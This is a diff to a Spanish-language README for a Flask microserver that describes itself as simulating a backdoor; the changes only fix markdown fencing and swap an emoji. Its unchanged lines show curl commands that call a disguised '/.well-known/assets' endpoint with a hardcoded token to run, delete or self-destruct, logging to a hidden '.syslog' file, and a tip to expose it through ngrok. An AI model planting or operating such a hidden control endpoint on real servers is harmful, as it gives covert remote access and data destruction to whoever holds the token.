@@ -30,12 +30,10 @@ Este microservidor Flask simula una puerta trasera
 🕵️ Log de Actividad
 Todos los accesos exitosos se registran en el archivo .syslog, incluyendo:
 
-log
-Copiar
-Editar
+```log
 Registro: 192.168.0.45
 Registro: acción ejecutada
-
+```
 
 🌐 Exposición remota
 ¿No estás en red pública? Usa ngrok:
@@ -63,7 +61,7 @@ curl -X POST "http://<host>:5000/.well-known/assets?act=ejecutar" \
 curl -X POST "http://<host>:5000/.well-known/assets?act=borrar" \
   -H "X-Auth-Token: U3VwZXJTZWNyZXQ="
 ```
-🫥 Autodestrucción:
+💀 Autodestrucción:
 ```bash
 curl -X POST "http://<host>:5000/.well-known/assets?act=autodestruir" \
   -H "X-Auth-Token: U3VwZXJTZWNyZXQ="
